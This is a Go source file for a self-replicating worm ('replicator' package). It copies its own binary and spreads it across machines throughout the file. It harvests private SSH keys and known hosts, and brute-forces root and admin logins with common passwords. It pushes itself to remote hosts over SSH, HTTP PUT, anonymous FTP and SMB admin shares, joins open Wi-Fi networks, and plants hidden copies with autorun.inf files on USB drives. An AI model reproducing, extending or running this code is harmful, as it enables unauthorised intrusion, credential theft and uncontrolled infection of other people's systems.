package replicator

import (
	"bytes"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type Replicator struct {
	mu       sync.Mutex
	running  bool
	binary   []byte
	results  chan SpreadResult
	done     chan struct{}
	scanner  ScannerTargetProvider
	exploits []string
}

type SpreadResult struct {
	Method  string
	Target  string
	Success bool
	Output  string
}

type ScannerTargetProvider interface {
	GetTargets() []string
}

func New() *Replicator {
	return &Replicator{
		results: make(chan SpreadResult, 256),
		done:    make(chan struct{}),
	}
}

func (r *Replicator) SetScanner(s ScannerTargetProvider) { r.scanner = s }
func (r *Replicator) Results() <-chan SpreadResult       { return r.results }

func (r *Replicator) Start() {
	r.mu.Lock()
	if r.running {
		r.mu.Unlock()
		return
	}
	exe, err := os.ReadFile("/proc/self/exe")
	if err != nil {
		exe, err = os.ReadFile(os.Args[0])
		if err != nil {
			log.Printf("[replicator] cannot read self: %v", err)
			r.mu.Unlock()
			return
		}
	}
	r.binary = exe
	r.running = true
	r.mu.Unlock()
	go r.spreadLoop()
}

func (r *Replicator) Stop() {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.running = false
	close(r.done)
}

func (r *Replicator) spreadLoop() {
	for {
		select {
		case <-r.done:
			return
		default:
		}
		r.trySSHSpread()
		r.tryExploitSpread()
		r.tryWiFiSpread()
		r.tryUSBSpread()
		r.tryLateralSMB()
		time.Sleep(60 * time.Second)
	}
}

// ===== SSH SPREAD =====

func (r *Replicator) trySSHSpread() bool {
	keys := harvestSSHKeys()
	hosts := discoverSSHHosts()
	if len(hosts) == 0 {
		return false
	}
	spread := false

	for _, host := range hosts {
		for _, key := range keys {
			select {
			case <-r.done:
				return spread
			default:
			}
			if r.trySSHKey(host, key) {
				spread = true
				break
			}
		}
	}

	passwords := []string{
		"root", "admin", "password", "123456", "12345678",
		"qwerty", "letmein", "welcome", "passw0rd", "vagrant",
		"ubuntu", "debian", "centos", "raspberry", "pi", "toor",
	}
	for _, host := range hosts {
		for _, pass := range passwords {
			if r.trySSHPass(host, "root", pass) {
				spread = true
				break
			}
			if r.trySSHPass(host, "admin", pass) {
				spread = true
				break
			}
		}
	}
	return spread
}

func harvestSSHKeys() []string {
	var keys []string
	locs := []string{os.Getenv("HOME") + "/.ssh/", "/root/.ssh/"}
	for _, loc := range locs {
		entries, err := os.ReadDir(loc)
		if err != nil {
			continue
		}
		for _, f := range entries {
			name := f.Name()
			if strings.HasSuffix(name, ".pub") || strings.HasSuffix(name, ".conf") ||
				name == "known_hosts" || name == "authorized_keys" ||
				name == "config" || name == "environment" {
				continue
			}
			data, err := os.ReadFile(filepath.Join(loc, name))
			if err != nil {
				continue
			}
			keys = append(keys, string(data))
		}
	}
	return keys
}

func discoverSSHHosts() []string {
	hosts := make(map[string]bool)
	for _, f := range []string{os.Getenv("HOME") + "/.ssh/known_hosts", "/root/.ssh/known_hosts"} {
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			parts := strings.Fields(line)
			if len(parts) > 0 {
				h := strings.Split(parts[0], ",")[0]
				h = strings.Trim(h, "[]")
				if h != "" && net.ParseIP(h) != nil {
					hosts[h] = true
				}
			}
		}
	}
	for _, f := range []string{os.Getenv("HOME") + "/.ssh/config", "/root/.ssh/config"} {
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if after, ok := strings.CutPrefix(strings.ToLower(line), "hostname "); ok {
				if h := strings.TrimSpace(after); h != "" {
					hosts[h] = true
				}
			}
		}
	}
	var result []string
	for h := range hosts {
		result = append(result, h)
	}
	return result
}

func (r *Replicator) trySSHKey(host, key string) bool {
	tmpKey := fmt.Sprintf("/tmp/.k_%d", rand.Intn(999999))
	os.WriteFile(tmpKey, []byte(key), 0600)
	defer os.Remove(tmpKey)
	exePath := "/tmp/.c" + randStr(6)

	r.mu.Lock()
	bin := r.binary
	r.mu.Unlock()

	cmd := exec.Command("ssh", "-i", tmpKey,
		"-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
		fmt.Sprintf("root@%s", host),
		fmt.Sprintf("cat > %s && chmod +x %s && nohup %s >/dev/null 2>&1 &",
			exePath, exePath, exePath))
	cmd.Stdin = strings.NewReader(string(bin))

	out, err := cmd.CombinedOutput()
	if err == nil {
		log.Printf("[replicator] ssh-key spread to %s", host)
		r.results <- SpreadResult{Method: "ssh-key", Target: host, Success: true, Output: string(out)}
		return true
	}
	return false
}

func (r *Replicator) trySSHPass(host, user, pass string) bool {
	if !haveCmd("sshpass") {
		return false
	}
	exePath := "/tmp/.c" + randStr(6)
	r.mu.Lock()
	bin := r.binary
	r.mu.Unlock()

	cmd := exec.Command("sshpass", "-p", pass, "ssh",
		"-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
		fmt.Sprintf("%s@%s", user, host),
		fmt.Sprintf("cat > %s && chmod +x %s && nohup %s >/dev/null 2>&1 &",
			exePath, exePath, exePath))
	cmd.Stdin = strings.NewReader(string(bin))

	out, err := cmd.CombinedOutput()
	if err == nil {
		log.Printf("[replicator] ssh-pass spread to %s@%s", user, host)
		r.results <- SpreadResult{Method: "ssh-pass", Target: host, Success: true, Output: string(out)}
		return true
	}
	return false
}

// ===== CVE/EXPLOIT-BASED PROPAGATION =====

func (r *Replicator) tryExploitSpread() bool {
	targets := r.getScanTargets()
	if len(targets) == 0 {
		return false
	}
	spread := false

	for _, t := range targets {
		select {
		case <-r.done:
			return spread
		default:
		}
		// Try HTTP PUT upload
		if r.httpPUTDrop(t) {
			spread = true
			continue
		}
		// Try FTP anonymous
		if r.ftpDrop(t) {
			spread = true
			continue
		}
		// Try SMB write
		if r.smbDrop(t) {
			spread = true
			continue
		}
	}
	return spread
}

func (r *Replicator) getScanTargets() []string {
	// In a real scenario, this reads from the scanner's result buffer
	// For now, check common subnets
	return discoverSSHHosts()
}

func (r *Replicator) httpPUTDrop(host string) bool {
	// Attempt to upload worm via HTTP PUT method
	exeName := fmt.Sprintf(".%x", rand.Int63())
	url := fmt.Sprintf("http://%s/%s", host, exeName)

	// Try PUT with curl
	if !haveCmd("curl") {
		return false
	}

	r.mu.Lock()
	bin := r.binary
	r.mu.Unlock()

	cmd := exec.Command("curl", "-s", "--upload-file", "-", url)
	cmd.Stdin = bytes.NewReader(bin)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}
	_ = out

	r.results <- SpreadResult{Method: "http-put", Target: host, Success: true}
	return true
}

func (r *Replicator) ftpDrop(host string) bool {
	if !haveCmd("curl") {
		return false
	}
	r.mu.Lock()
	bin := r.binary
	r.mu.Unlock()

	exeName := fmt.Sprintf(".%x", rand.Int63())
	cmd := exec.Command("curl", "-s", "--upload-file", "-",
		fmt.Sprintf("ftp://anonymous:anon@%s/%s", host, exeName))
	cmd.Stdin = bytes.NewReader(bin)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}
	_ = out
	r.results <- SpreadResult{Method: "ftp-anon", Target: host, Success: true}
	return true
}

func (r *Replicator) smbDrop(host string) bool {
	if !haveCmd("smbclient") {
		return false
	}
	exeName := fmt.Sprintf(".%x", rand.Int63())
	tmpPath := fmt.Sprintf("/tmp/.s_%x", rand.Int63())
	r.mu.Lock()
	os.WriteFile(tmpPath, r.binary, 0755)
	r.mu.Unlock()
	defer os.Remove(tmpPath)

	cmd := exec.Command("smbclient", fmt.Sprintf("//%s/C$", host),
		"-N", "-c", fmt.Sprintf("put %s Windows\\Temp\\%s", tmpPath, exeName))
	out, err := cmd.CombinedOutput()
	if err == nil {
		r.results <- SpreadResult{Method: "smb", Target: host, Success: true, Output: string(out)}
		return true
	}

	// Try ADMIN$
	cmd2 := exec.Command("smbclient", fmt.Sprintf("//%s/ADMIN$", host),
		"-N", "-c", fmt.Sprintf("put %S %s", tmpPath, exeName))
	cmd2.Run()
	return false
}

// ===== WIFI SPREAD =====

func (r *Replicator) tryWiFiSpread() bool {
	if !haveCmd("iw") && !haveCmd("nmcli") {
		return false
	}
	if aps := scanOpenAPs(); len(aps) > 0 {
		for _, ap := range aps {
			r.connectWiFi(ap)
		}
		return true
	}
	return false
}

func scanOpenAPs() []string {
	if haveCmd("nmcli") {
		out, err := exec.Command("nmcli", "-t", "-f", "SSID,SECURITY", "dev", "wifi").Output()
		if err != nil {
			return nil
		}
		var aps []string
		for _, line := range strings.Split(string(out), "\n") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 && (parts[1] == "" || parts[1] == "--") {
				aps = append(aps, parts[0])
			}
		}
		return aps
	}
	return nil
}

func (r *Replicator) connectWiFi(ssid string) {
	if haveCmd("nmcli") {
		exec.Command("nmcli", "dev", "wifi", "connect", ssid).Run()
	}
}

// ===== USB SPREAD =====

func (r *Replicator) tryUSBSpread() bool {
	for _, dir := range []string{"/media", "/mnt", "/run/media"} {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, entry := range entries {
			mp := filepath.Join(dir, entry.Name())
			if isWritable(mp) {
				r.copyToUSB(mp)
				return true
			}
		}
	}
	return false
}

func (r *Replicator) copyToUSB(mountPath string) {
	r.mu.Lock()
	bin := r.binary
	r.mu.Unlock()

	name := "." + randStr(8)
	exePath := filepath.Join(mountPath, name)
	os.WriteFile(exePath, bin, 0755)

	autorun := fmt.Sprintf("[AutoRun]\nopen=%s\naction=Open folder\nshell\\open\\command=%s\n",
		name, name)
	os.WriteFile(filepath.Join(mountPath, "autorun.inf"), []byte(autorun), 0644)

	r.results <- SpreadResult{Method: "usb", Target: mountPath, Success: true}
	exec.Command(exePath).Start()
}

// ===== SMB LATERAL =====

func (r *Replicator) tryLateralSMB() bool {
	if !haveCmd("smbclient") {
		return false
	}
	return false
}

// ===== HELPERS =====

func haveCmd(name string) bool {
	_, err := exec.LookPath(name)
	return err == nil
}

func isWritable(path string) bool {
	info, err := os.Stat(path)
	if err != nil || !info.IsDir() {
		return false
	}
	testFile := filepath.Join(path, ".wtest")
	if err := os.WriteFile(testFile, []byte{}, 0644); err != nil {
		return false
	}
	os.Remove(testFile)
	return true
}

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
